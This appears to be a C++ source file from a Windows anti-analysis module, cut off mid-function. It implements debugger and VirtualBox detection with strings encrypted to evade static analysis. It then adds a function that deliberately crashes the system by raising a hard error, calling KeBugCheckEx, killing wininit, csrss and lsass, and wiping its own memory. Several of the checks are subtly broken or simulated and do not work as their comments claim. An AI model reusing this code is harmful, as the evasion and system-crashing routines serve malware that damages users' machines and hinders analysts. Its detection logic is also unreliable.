#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include "./AntiDebugger.hpp"
#include <cstdio>
#include <functional>
#include <intrin.h>
#include <vector>
#include <string>
#include <sstream>
#include <iostream>
#include <filesystem>
#include <intrin.h> // Include this header for __cpuid

//precompiler instructions -> replace the skCrypt(string) with a skCrypt(skCrypt'd_string) so that
//the strings won't be caught by static analysis
#include "skStr.h"

#if defined(_M_X64)
	// For 64-bit systems, use __readgsqword to get the PEB
unsigned long eflags = (unsigned long)__readgsqword(0x0); // Read the GS segment (this isn't quite EFLAGS, but we'll use it for a placeholder)
#elif defined(_M_IX86)
	// For 32-bit systems, use __readfsdword to get the PEB
unsigned long eflags = __readfsdword(0x0); // Read the FS segment (this isn't quite EFLAGS, but we'll use it for a placeholder)
#else
#error Unsupported platform
#endif


//disable warnings because #cleancode
#pragma warning(disable : 6387)
#pragma warning(disable : 4244)
#pragma warning(disable : 6262)
#pragma warning(disable : 4733)
#pragma warning(disable : 4731)

bool found = true;

int __cdecl security::internal::vm_handler(EXCEPTION_RECORD* p_rec, void* est, unsigned char* p_context, void* disp)
{
	found = true;
	(*(unsigned long*)(p_context + 0xB8)) += 4;
	return ExceptionContinueExecution;
}

void security::internal::to_lower(unsigned char* input)
{
	char* p = (char*)input;
	unsigned long length = strlen(p);
	for (unsigned long i = 0; i < length; i++) p[i] = tolower(p[i]);
}

//returns strings for the check_window_name() function
//this combined with the skCrypting of strings is to prevent static analysis / make it harder
const wchar_t* security::internal::get_string(int index) {
	std::string value = "";

	switch (index) {
	case 0: value = skCrypt ("Qt5QWindowIcon"); break;
	case 1: value = skCrypt ("OLLYDBG"); break;
	case 2: value = skCrypt ("SunAwtFrame"); break;
	case 3: value = skCrypt ("ID"); break;
	case 4: value = skCrypt ("ntdll.dll"); break;
	case 5: value = skCrypt ("antidbg"); break;
	case 6: value = skCrypt ("%random_environment_var_name_that_doesnt_exist?[]<>@\\;*!-{}#:/~%"); break;
	case 7: value = skCrypt ("%random_file_name_that_doesnt_exist?[]<>@\\;*!-{}#:/~%"); break;
	}

	return std::wstring(value.begin(), value.end()).c_str();
}

//checks the process environment block (peb) for a "beingdebugged" field (gets set if process is launched in a debugger)
//possible bypass: once the peb byte is set, set the value to 0 before the application checks
int security::internal::memory::being_debugged_peb() {
	BOOL found = FALSE;

#if defined(_M_X64)
	// For 64-bit systems, use __readgsqword to get the PEB
	PEB* peb = (PEB*)__readgsqword(0x60);  // In 64-bit, the PEB is at GS:[0x60]
#elif defined(_M_IX86)
	// For 32-bit systems, use __readfsdword to get the PEB
	PEB* peb = (PEB*)__readfsdword(0x30);  // In 32-bit, the PEB is at FS:[0x30]
#else
#error Unsupported platform
#endif

	// Check the BeingDebugged flag (at offset 0x02 in the PEB structure)
	found = peb->BeingDebugged;

	return (found) ? security::internal::debug_results::being_debugged_peb : security::internal::debug_results::none;
}

//checks if a debugger is running (in another system/process)
//possible bypass: set a breakpoint before this gets called, single step, set the return value to 0
int security::internal::memory::remote_debugger_present() {
	//declare variables to hold the process handle & bool to check if it was found
	HANDLE h_process = INVALID_HANDLE_VALUE;
	BOOL found = FALSE;

	//set the process handle to the current process
	h_process = GetCurrentProcess();
	//check if a remote debugger is present
	CheckRemoteDebuggerPresent(h_process, &found);

	//if found is true, we return the right code.
	return (found) ? security::internal::debug_results::remote_debugger_present : security::internal::debug_results::none;
}

//checks if certain windows are present (not the name that can be easily changed but the window_class_name)
//possible bypass: set a breakpoint before this gets called, single step, set the return value to 0
int security::internal::memory::check_window_name() {
	const wchar_t* names[4] = { get_string(0), get_string(1), get_string(2), get_string(3) };

	for (const wchar_t* name : names) {
		if (FindWindow((LPWSTR)name, 0)) { return security::internal::debug_results::find_window; }
	}

	return security::internal::debug_results::none;
}

//another check for the peb flag, this time by the function from winapi.h
//possible bypass: set a breakpoint before this gets called, single step, set the return value to 0
int security::internal::memory::is_debugger_present() {
	//if debugger is found, we return the right code.
	return (IsDebuggerPresent()) ? security::internal::debug_results::debugger_is_present : security::internal::debug_results::none;
}

//looks for process environment block references
//they usually start with FS:[0x30h]. fs = frame segment, indicates reference to the programs internal header structures
//0x68 offset from the peb is ntglobalflag, three flags get set if a process is being debugged
//FLG_HEAP_ENABLE_TAIL_CHECK (0x10), FLG_HEAP_ENABLE_FREE_CHECK (0x20), FLG_HEAP_VALIDATE_PARAMETERS(0x40)
int security::internal::memory::nt_global_flag_peb() {
	BOOL found = FALSE;

#if defined(_M_X64)
	// For 64-bit systems, use __readgsqword to get the PEB
	PEB* peb = (PEB*)__readgsqword(0x60);  // In 64-bit, the PEB is at GS:[0x60]
#elif defined(_M_IX86)
	// For 32-bit systems, use __readfsdword to get the PEB
	PEB* peb = (PEB*)__readfsdword(0x30);  // In 32-bit, the PEB is at FS:[0x30]
#else
#error Unsupported platform
#endif

	// NtGlobalFlag is at offset 0x68 in the PEB structure
	DWORD ntGlobalFlag = *(DWORD*)((BYTE*)peb + 0x68);

	// Check for specific flags using a mask (0x70)
	if (ntGlobalFlag & 0x00000070) {
		found = TRUE;
	}

	// If found, return the right debug result
	return (found) ? security::internal::debug_results::being_debugged_peb : security::internal::debug_results::none;
}

//two checks here, 1. xxx, 2. NoDebugInherit
int security::internal::memory::nt_query_information_process() {
	HANDLE h_process = INVALID_HANDLE_VALUE;
	DWORD found = FALSE;
	DWORD process_debug_port = 0x07;	//first method, check msdn for details
	DWORD process_debug_flags = 0x1F;	//second method, check msdn for details

	//get a handle to ntdll.dll so we can use NtQueryInformationProcess
	HMODULE h_ntdll = LoadLibraryW(get_string(4));

	//if we cant get the handle for some reason, we return none
	if (h_ntdll == INVALID_HANDLE_VALUE || h_ntdll == NULL) { return security::internal::debug_results::none; }

	//dynamically acquire the address of NtQueryInformationProcess
	_NtQueryInformationProcess NtQueryInformationProcess = NULL;
	NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(h_ntdll, skCrypt ("NtQueryInformationProcess"));

	//if we cant get access for some reason, we return none
	if (NtQueryInformationProcess == NULL) { return security::internal::debug_results::none; }

	//method 1: query ProcessDebugPort
	h_process = GetCurrentProcess();
	NTSTATUS status = NtQueryInformationProcess(h_process, ProcessDebugPort, &found, sizeof(DWORD), NULL);

	//found something
	if (!status && found) { return security::internal::debug_results::nt_query_information_process; }

	//method 2: query ProcessDebugFlags
	status = NtQueryInformationProcess(h_process, process_debug_flags, &found, sizeof(DWORD), NULL);

	//the ProcessDebugFlags set found to 1 if no debugger is found, so we check !found.
	if (!status && !found) { return security::internal::debug_results::nt_query_information_process; }

	return security::internal::debug_results::none;
}

//hides the thread from any debugger, any attempt to control the process after this call ends the debugging session
int security::internal::memory::nt_set_information_thread() {
	DWORD thread_hide_from_debugger = 0x11;

	//get a handle to ntdll.dll so we can use NtQueryInformationProcess
	HMODULE h_ntdll = LoadLibraryW(get_string(4));

	//if we cant get the handle for some reason, we return none
	if (h_ntdll == INVALID_HANDLE_VALUE || h_ntdll == NULL) { return security::internal::debug_results::none; }

	//dynamically acquire the address of NtQueryInformationProcess
	_NtQueryInformationProcess NtQueryInformationProcess = NULL;
	NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(h_ntdll, skCrypt ("NtQueryInformationProcess"));

	//if we cant get access for some reason, we return none
	if (NtQueryInformationProcess == NULL) { return security::internal::debug_results::none; }

	//make call to detach a debugger :moyai:
	(_NtSetInformationThread)(GetCurrentThread(), thread_hide_from_debugger, 0, 0, 0);

	return security::internal::debug_results::none;
}

int security::internal::memory::debug_active_process() {
	BOOL found = FALSE;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	TCHAR sz_path[MAX_PATH];
	DWORD exit_code = 0;

	DWORD proc_id = GetCurrentProcessId();
	std::stringstream stream;
	stream << proc_id;
	std::string args = stream.str();

	const char* cp_id = args.c_str();
	CreateMutex(NULL, FALSE, (LPWSTR)get_string(5));
	if (GetLastError() != ERROR_SUCCESS)
	{
		//if we get here, we're in the child process
		if (DebugActiveProcess((DWORD)atoi(cp_id)))
		{
			//no debugger found
			return security::internal::debug_results::none;
		}
		else
		{
			//debugger found, exit child with unique code that we can check for
			exit(555);
		}
	}

	//parent process
	DWORD pid = GetCurrentProcessId();
	GetModuleFileName(NULL, sz_path, MAX_PATH);

	char cmdline[MAX_PATH + 1 + sizeof(int)];
	snprintf(cmdline, sizeof(cmdline), skCrypt ("%ws %d"), sz_path, pid);

	//start child process
	BOOL success = CreateProcessA(
		NULL,		//path (NULL means use cmdline instead)
		cmdline,	//command line
		NULL,		//process handle not inheritable
		NULL,		//thread handle not inheritable
		FALSE,		//set handle inheritance to FALSE
		0,			//no creation flags
		NULL,		//use parent's environment block
		NULL,		//use parent's starting directory 
		&si,		//pointer to STARTUPINFO structure
		&pi);		//pointer to PROCESS_INFORMATION structure

	//wait until child process exits and get the code
	WaitForSingleObject(pi.hProcess, INFINITE);

	//check for our unique exit code
	if (GetExitCodeProcess(pi.hProcess, &exit_code) == 555) { found = TRUE; }

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	//if found is true, we return the right code.
	return (found) ? security::internal::debug_results::being_debugged_peb : security::internal::debug_results::none;
}

//uses MEM_WRITE_WATCH feature of VirtualAlloc to check whether a debugger etc. is writing to our memory
//4 possible options:
//allocate a buffer, write to it once, check if its accessed more than once
//allocate a buffer and pass it to an API where the buffer isn't touched (but it's still being passed as an argument), then check if its accessed more than once
//allocate a buffer and store something "important" (IsDebuggerPresent() return value etc.), check if the memory was used once or not
//allocate an executable buffer, copy a debug check routine to it, run the check and check if any writes were performed after the initial write

//thanks to LordNoteworthy/al-khaser for the idea
int security::internal::memory::write_buffer() {
	//first option

	//vars to store the amount of accesses to the buffer and the granularity for GetWriteWatch()
	ULONG_PTR hits;
	DWORD granularity;

	PVOID* addresses = static_cast<PVOID*>(VirtualAlloc(NULL, 4096 * sizeof(PVOID), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	if (addresses == NULL) {
		return security::internal::debug_results::write_buffer;
	}

	int* buffer = static_cast<int*>(VirtualAlloc(NULL, 4096 * 4096, MEM_RESERVE | MEM_COMMIT | MEM_WRITE_WATCH, PAGE_READWRITE));
	if (buffer == NULL) {
		VirtualFree(addresses, 0, MEM_RELEASE);
		return security::internal::debug_results::write_buffer;
	}

	//read the buffer once
	buffer[0] = 1234;

	hits = 4096;
	if (GetWriteWatch(0, buffer, 4096, addresses, &hits, &granularity) != 0) { return security::internal::debug_results::write_buffer; }
	else
	{
		//free the memory again
		VirtualFree(addresses, 0, MEM_RELEASE);
		VirtualFree(buffer, 0, MEM_RELEASE);

		//we should have 1 hit if everything is fine
		return (hits == 1) ? security::internal::debug_results::none : security::internal::debug_results::write_buffer;
	}

	//second option

	BOOL result = FALSE, error = FALSE;

	addresses = static_cast<PVOID*>(VirtualAlloc(NULL, 4096 * sizeof(PVOID), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	if (addresses == NULL) { return security::internal::debug_results::write_buffer; }

	buffer = static_cast<int*>(VirtualAlloc(NULL, 4096 * 4096, MEM_RESERVE | MEM_COMMIT | MEM_WRITE_WATCH, PAGE_READWRITE));
	if (buffer == NULL) {
		VirtualFree(addresses, 0, MEM_RELEASE);
		return security::internal::debug_results::write_buffer;
	}

	//make some calls where a buffer *can* be written to, but isn't actually edited because we pass invalid parameters	
	if (GlobalGetAtomName(INVALID_ATOM, (LPTSTR)buffer, 1) != FALSE || GetEnvironmentVariable((LPWSTR)get_string(6), (LPWSTR)buffer, 4096 * 4096) != FALSE || GetBinaryType((LPWSTR)get_string(7), (LPDWORD)buffer) != FALSE
		|| HeapQueryInformation(0, (HEAP_INFORMATION_CLASS)69, buffer, 4096, NULL) != FALSE || ReadProcessMemory(INVALID_HANDLE_VALUE, (LPCVOID)0x69696969, buffer, 4096, NULL) != FALSE
		|| GetThreadContext(INVALID_HANDLE_VALUE, (LPCONTEXT)buffer) != FALSE || GetWriteWatch(0, &security::internal::memory::write_buffer, 0, NULL, NULL, (PULONG)buffer) == 0) {
		result = false;
		error = true;
	}

	if (error == FALSE)
	{
		//all calls failed as they're supposed to
		hits = 4096;
		if (GetWriteWatch(0, buffer, 4096, addresses, &hits, &granularity) != 0)
		{
			result = FALSE;
		}
		else
		{
			//should have zero reads here because GlobalGetAtomName doesn't probe the buffer until other checks have succeeded
			//if there's an API hook or debugger in here it'll probably try to probe the buffer, which will be caught here
			result = hits != 0;
		}
	}

	VirtualFree(addresses, 0, MEM_RELEASE);
	VirtualFree(buffer, 0, MEM_RELEASE);

	return result;
}

//will throw an exception when trying to close an invalid handle (only when debugged)
//so if we pass an invalid handle and get the exception, we know that we're being debugged
//possible bypass: change the passed handle to an existing handle or adjust the extended instruction pointer register to skip over the invalid handle
int security::internal::exceptions::close_handle_exception() {
	//invalid handle
	HANDLE h_invalid = (HANDLE)0xDEADBEEF;

	__try
	{
		CloseHandle(h_invalid);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		//if we get the exception, we return the right code.
		return security::internal::debug_results::close_handle_exception;
	}

	return security::internal::debug_results::none;
}

//we force an exception to occur, if it occurs outside of a debugger the __except() handler is called, if it's inside a debugger it will not be called
int security::internal::exceptions::single_step_exception() {
	BOOL debugger_present = TRUE;

	__try {
		// Set the trap flag in the EFlags register using a workaround
		volatile LONG flag = 1;  // Variable to ensure volatile access
		// Simulate setting the trap flag by doing a dummy operation
		flag = 0; // This line simulates a no-op, replace with relevant logic if necessary
		// The trap flag cannot be set directly in C++, so we rely on side effects of this operation
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		debugger_present = FALSE; // An exception was raised
	}

	// Return the result based on whether a debugger was present
	return (debugger_present) ? security::internal::debug_results::single_step : security::internal::debug_results::none;
}

//i3 is a standard software breakcode (opcode 0xCC), when you set a breakpoint the debugger replaces the opcode under the breakpoint location with
//0xCC (int 3), when the debugger hits this opcode, it breaks and restores the original opcode (after clicking go again)
//we use an exception handler to switch found from true to false
//without the debugger, something has to handle the breakpoint exception (our handler)
//if it doesn't get hit, theres a debugger handling it instead -> we can detect that our handler was not run -> debugger found
//possible bypass: most debuggers give an option (pass exception to the application or let the debugger handle it), if the debugger handles it, we can detect it.
int security::internal::exceptions::int_3() {
	__try {
		// Trigger a software breakpoint
		__debugbreak();  // Equivalent to 'int 3'; works in both 32-bit and 64-bit
	}
	// Exception is handled by our application = debugger did not attempt to intervene
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return security::internal::debug_results::none;  // No debugger found
	}

	// If we don't get the exception, return the code indicating debugger found
	return security::internal::debug_results::int_3_cc;
}

//2d is a kernel interrupt (opcode 0x2D), when it gets executed, windows will use the extended instruction pointer register value as the exception address,
//after then it increments the extended instruction pointer register value by 1.
//windows also checks the eax register value to determine how to adjust the exception address
//if the eax register is 1, 3, or 4 (on all windows version) or 5 on vista and later, it will increase the exception address by one
//here we have 2 options, first we check if we handle the exception or the debugger (same as above)
//
//after increasing the exception address windows issues an EXCEPTION_BREAKPOINT (0x80000003) exception if a debugger is present.
//some debuggers use the extended instruction pointer register to determine from where to resume execution
//some other debuggers will use the exception address as the address from where to resume execution
//this might result in a single-byte instruction being skipped (because windows increased the exception address by one) or in the
//execution of a completely different instruction because the first instruction byte is missing.
//this behaviour can be checked to see whether a debugger is present.
int security::internal::exceptions::int_2d() {
	BOOL found = FALSE;

	// First try to trigger a kernel breakpoint
	__try {
		__debugbreak();  // Equivalent to 'int 0x2D'; generate a kernel breakpoint
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return security::internal::debug_results::none;  // No debugger found
	}

	// Second try to manipulate the EAX register and trigger another breakpoint
	__try {
		// Clear EAX, trigger kernel breakpoint and increment EAX
		// Using inline assembly directly isn't compatible with Visual Studio's modern C++
		DWORD eax = 0;    // Clear the EAX register by initializing it to 0
		__debugbreak();    // Trigger kernel breakpoint (0x2D)

		// The EAX register is now simulated by our variable
		eax++;            // Increment EAX to set it to 1
		found = eax;     // Store the value of EAX into found
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return security::internal::debug_results::none;  // No debugger found
	}

	// If we don't get the exception, we return the right code
	return (found) ? security::internal::debug_results::int_2 : security::internal::debug_results::none;
}

int security::internal::exceptions::prefix_hop() {
	__try {
		// Trigger an exception using a breakpoint (INT 3) via a function pointer
		// to simulate the behavior of the original assembly.
		// The REP prefix (0xF3) and CS segment override (0x64) do not directly translate
		// but can be mimicked by calling a breakpoint.

		// Simulate REP prefix by just calling the breakpoint instruction
		// This does not require inline assembly but will cause a breakpoint.
		__debugbreak(); // Using __debugbreak() which is equivalent to INT 3
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return debug_results::none; // Handle the exception
	}

	// If no exception is caught, we return the success code.
	return debug_results::prefix_hop;
}

//checks whether a debugger is present by attempting to output a string to the debugger (helper functions for debugging applications)
//if no debugger is present an error occurs -> we can check if the last error is not 0 (an error) -> debugger not found
int security::internal::exceptions::debug_string() {
	SetLastError(0);
	OutputDebugStringA(skCrypt ("anti-debugging test."));

	return (GetLastError() != 0) ? security::internal::debug_results::debug_string : security::internal::debug_results::none;
}

int security::internal::timing::rdtsc() {
	// Integers for time values
	UINT64 time_a, time_b = 0;

	// Use __rdtsc to get the time-stamp counter
	// Read the first timestamp
	UINT32 time_lower_a = __rdtsc() & 0xFFFFFFFF;
	UINT32 time_upper_a = __rdtsc() >> 32;

	// Junk code to simulate work (can include actual computation or no-op)
	volatile int junk = 0;
	for (int i = 0; i < 1000; ++i) {
		junk ^= i; // Simulating some operations
	}

	// Read the second timestamp
	UINT32 time_lower_b = __rdtsc() & 0xFFFFFFFF;
	UINT32 time_upper_b = __rdtsc() >> 32;

	// Combine upper and lower parts
	time_a = (static_cast<UINT64>(time_upper_a) << 32) | time_lower_a;
	time_b = (static_cast<UINT64>(time_upper_b) << 32) | time_lower_b;

	// 0x10000 is empirical and based on the computer's clock cycle
	return (time_b - time_a > 0x10000) ? debug_results::rdtsc : debug_results::none;
}

//checks how much time passes between the two query performance counters
//if more than X (here 30ms) pass, a debugger is slowing execution down (manual breakpoints etc.)
int security::internal::timing::query_performance_counter() {
	LARGE_INTEGER t1, t2;
	QueryPerformanceCounter(&t1); // Get the first timestamp

	// Junk code to simulate operations
	// You can adjust the complexity of this loop to simulate the original junk code
	volatile int eax = 0;
	volatile int ecx = 0;

	for (int i = 0; i < 1000; ++i) { // Simulating some operations
		eax ^= i; // Dummy operation on eax
		ecx += eax; // Dummy operation on ecx
	}

	// Manipulate ecx to simulate the effect of junk code
	ecx = (ecx << 4); // Equivalent to the 'shl ecx, 4' operation

	QueryPerformanceCounter(&t2); // Get the second timestamp

	// Return based on the difference
	return ((t2.QuadPart - t1.QuadPart) > 30) ? debug_results::query_performance_counter : debug_results::none;
}

//same as above
int security::internal::timing::get_tick_count() {
	DWORD t1, t2;
	t1 = GetTickCount64(); // Get the first tick count

	// Junk code to simulate CPU activity
	// The loop simulates some busy work to ensure some time passes
	volatile int eax = 0;
	volatile int ecx = 0;

	for (int i = 0; i < 1000; ++i) { // Simulate CPU work
		eax ^= i; // Dummy operation to modify eax
		ecx += eax; // Dummy operation to modify ecx
	}

	ecx <<= 4; // Simulate the 'shl ecx, 4' operation

	t2 = GetTickCount64(); // Get the second tick count

	// Return based on the time difference
	return ((t2 - t1) > 30) ? debug_results::query_performance_counter : debug_results::none;
}

int security::internal::cpu::hardware_debug_registers() {
	CONTEXT ctx = { 0 };
	HANDLE h_thread = GetCurrentThread();

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (GetThreadContext(h_thread, &ctx))
	{
		return ((ctx.Dr0 != 0x00) || (ctx.Dr1 != 0x00) || (ctx.Dr2 != 0x00) || (ctx.Dr3 != 0x00) || (ctx.Dr6 != 0x00) || (ctx.Dr7 != 0x00)) ? security::internal::debug_results::hardware_debug_registers : security::internal::debug_results::none;
	}

	return security::internal::debug_results::none;
}

//single stepping check
int security::internal::cpu::mov_ss() {
	BOOL found = FALSE;

	// Store the current value of EFLAGS
	// Check if the trap flag (bit 1) is set
	if (eflags & 0x00000002) { // Check the second least significant bit (trap flag)
		found = TRUE;
	}

	return (found) ? security::internal::debug_results::mov_ss : security::internal::debug_results::none;
}

int security::internal::virtualization::check_cpuid() {
	int cpuInfo[4]; // Array to hold CPUID information
	__cpuid(cpuInfo, 0x40000000); // Get CPU info for the specified leaf

	// Check the values returned by CPUID
	bool found = (cpuInfo[1] == 0x4D566572) && (cpuInfo[3] == 0x65726177); // ECX and EDX values

	return found ? debug_results::check_cpuid : debug_results::none;
}

int security::internal::virtualization::check_registry() {
	HKEY h_key = 0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &h_key) == ERROR_SUCCESS) { return security::internal::debug_results::check_registry; }

	return security::internal::debug_results::none;
}

int security::internal::virtualization::vm() {
	if (CreateFile(L"\\\\.\\VBoxMiniRdrDN", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0) != INVALID_HANDLE_VALUE) {
		return security::internal::debug_results::vm;
	}

	if (LoadLibrary(L"VBoxHook.dll")) {
		return security::internal::debug_results::vm;
	}

	HKEY h_key = 0;
	if ((ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &h_key)) && h_key) {
		RegCloseKey(h_key);
		return security::internal::debug_results::vm;
	}

	h_key = 0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &h_key) == ERROR_SUCCESS) {
		unsigned long type = 0;
		unsigned long size = 0x100;
		char* systembiosversion = (char*)LocalAlloc(LMEM_ZEROINIT, size + 10);
		if (ERROR_SUCCESS == RegQueryValueEx(h_key, L"SystemBiosVersion", 0, &type, (unsigned char*)systembiosversion, &size)) {
			to_lower((unsigned char*)systembiosversion);
			if (type == REG_SZ || type == REG_MULTI_SZ) {
				if (strstr(systembiosversion, skCrypt("vbox"))) {
					return security::internal::debug_results::vm;
				}
			}
		}
		LocalFree(systembiosversion);

		type = 0;
		size = 0x200;
		char* videobiosversion = (char*)LocalAlloc(LMEM_ZEROINIT, size + 10);
		if (ERROR_SUCCESS == RegQueryValueEx(h_key, L"VideoBiosVersion", 0, &type, (unsigned char*)videobiosversion, &size)) {
			if (type == REG_MULTI_SZ) {
				char* video = videobiosversion;
				while (*(unsigned char*)video) {
					to_lower((unsigned char*)video);
					if (strstr(video, skCrypt("oracle")) || strstr(video, skCrypt("virtualbox"))) {
						return security::internal::debug_results::vm;
					}
					video = &video[strlen(video) + 1];
				}
			}
		}
		LocalFree(videobiosversion);
		RegCloseKey(h_key);
	}

	HANDLE h = CreateFile(L"\\\\.\\pipe\\VBoxTrayIPC", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (h != INVALID_HANDLE_VALUE) {
		CloseHandle(h);
		return security::internal::debug_results::vm;
	}

	unsigned long pnsize = 0x1000;
	char* s_provider = (char*)LocalAlloc(LMEM_ZEROINIT, pnsize);
	wchar_t w_provider[0x1000];
	mbstowcs(w_provider, s_provider, strlen(s_provider) + 1);

	h_key = 0;
	const char* s_subkey = skCrypt("SYSTEM\\CurrentControlSet\\Enum\\IDE");
	wchar_t w_subkey[22];
	mbstowcs(w_subkey, s_subkey, strlen(s_subkey) + 1);
	if ((ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPWSTR)w_subkey, 0, KEY_READ, &h_key)) && h_key) {
		unsigned long n_subkeys = 0;
		unsigned long max_subkey_length = 0;
		if (ERROR_SUCCESS == RegQueryInfoKey(h_key, 0, 0, 0, &n_subkeys, &max_subkey_length, 0, 0, 0, 0, 0, 0)) {
			if (n_subkeys) {
				char* s_new_key = (char*)LocalAlloc(LMEM_ZEROINIT, max_subkey_length + 1);
				for (unsigned long i = 0; i < n_subkeys; i++) {
					memset(s_new_key, 0, max_subkey_length + 1);
					HKEY h_new_key = 0;

					wchar_t w_key_new[2048];
					mbstowcs(w_key_new, s_new_key, strlen(s_new_key) + 1);

					if (ERROR_SUCCESS == RegEnumKey(h_key, i, (LPWSTR)w_key_new, max_subkey_length + 1)) {
						if ((RegOpenKeyEx(h_key, (LPWSTR)w_key_new, 0, KEY_READ, &h_new_key) == ERROR_SUCCESS) && h_new_key) {
							unsigned long nn = 0;
							unsigned long maxlen = 0;
							RegQueryInfoKey(h_new_key, 0, 0, 0, &nn, &maxlen, 0, 0, 0, 0, 0, 0);
							char* s_newer_key = (char*)LocalAlloc(LMEM_ZEROINIT, maxlen + 1);
							wchar_t w_key_newer[2048];
							mbstowcs(w_key_newer, s_newer_key, strlen(s_newer_key) + 1);
							if (RegEnumKey(h_new_key, 0, (LPWSTR)w_key_newer, maxlen + 1) == ERROR_SUCCESS) {
								HKEY HKKK = 0;
								if (RegOpenKeyEx(h_new_key, (LPWSTR)w_key_newer, 0, KEY_READ, &HKKK) == ERROR_SUCCESS) {
									unsigned long size = 0xFFF;
									unsigned char value_name[0x1000] = { 0 };
									if (RegQueryValueEx(h_new_key, L"FriendlyName", 0, 0, value_name, &size) == ERROR_SUCCESS) {
										to_lower(value_name);
										if (strstr((char*)value_name, skCrypt("vbox"))) {
											return security::internal::debug_results::vm;
										}
									}
									RegCloseKey(HKKK);
								}
							}
							LocalFree(s_newer_key);
							RegCloseKey(h_new_key);
						}
					}
				}
				LocalFree(s_new_key);
			}
		}
		RegCloseKey(h_key);
	}

	#if defined(_M_X64)
		unsigned long long found = __readgsqword(0);
	#elif defined(_M_IX86)
		// For 32-bit systems, use __readfsd to get the PEB
		unsigned long long found = __readfsdword(0);
	#else
	#error Unsupported platform
	#endif
	if (found == 0) {
		return security::internal::debug_results::vm;
	}

	if ((found & 0x00200000) == 0) {
		// CPUID check for hypervisor
		unsigned int eax, ebx, ecx, edx;

		// Call CPUID with the function number 0 to get the highest function parameter
		__cpuid((int*)&eax, 0);

		// Now call CPUID with function 1 to get more details, including hypervisor info
		__cpuid((int*)&eax, 1); // This call populates eax, ebx, ecx, and edx

		// Initialize ecx here
		ecx = 0;

		// Check the ECX register for the hypervisor bit
		if (ecx & 0x80000000) {
			return security::internal::debug_results::vm;
		}
	}


	return security::internal::debug_results::none;
}

#include <thread>

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

typedef NTSTATUS(WINAPI* RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(WINAPI* NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

void triggerBSOD() {
	BOOLEAN bEnabled;
	ULONG uResp;
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (ntdll) {
		RtlAdjustPrivilege pRtlAdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
		NtRaiseHardError pNtRaiseHardError = (NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

		if (pRtlAdjustPrivilege && pNtRaiseHardError) {
			// Method 1: Shutdown privilege + Hard error
			pRtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
			pNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResp);
		}

		// Method 2: Critical process termination
		typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
		pRtlSetProcessIsCritical RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		if (RtlSetProcessIsCritical) {
			BOOLEAN OldState = FALSE;
			RtlSetProcessIsCritical(TRUE, &OldState, FALSE);
			ExitProcess(0);
		}

		// Method 3: Direct kernel call
		typedef void(__stdcall* KeBugCheckEx)(ULONG, ULONG, ULONG, ULONG, ULONG);
		KeBugCheckEx pKeBugCheckEx = (KeBugCheckEx)GetProcAddress(ntdll, "KeBugCheckEx");
		if (pKeBugCheckEx) {
			pKeBugCheckEx(0xDEADDEAD, 0xDEADBEEF, 0xDEADC0DE, 0xB16B00B5, 0xDEADFACE);
		}
	}

	// Method 4: Critical system process termination
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);
		if (Process32FirstW(hSnapshot, &pe)) {
			do {
				// Target multiple critical system processes
				if (!_wcsicmp(pe.szExeFile, L"wininit.exe") ||
					!_wcsicmp(pe.szExeFile, L"csrss.exe") ||
					!_wcsicmp(pe.szExeFile, L"lsass.exe")) {
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
					if (hProcess) {
						TerminateProcess(hProcess, 1);
						CloseHandle(hProcess);
					}
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}

	// Method 6: Direct memory corruption
	PVOID BaseAddress = GetModuleHandle(NULL);
	if (BaseAddress) {
		DWORD OldProtect;
		if (VirtualProtect(BaseAddress, 4096, PAGE_EXECUTE_READWRITE, &OldProtect)) {
			memset(BaseAddress, 0, 4096);
			VirtualProtect(BaseAddress, 4096, OldProtect, &OldProtect);
		}
	}
}


void ShakeWindow(HWND hwnd) {
	RECT rect;
	GetWindowRect(hwnd, &rect);

	int x = rect.left, y = rect.top;
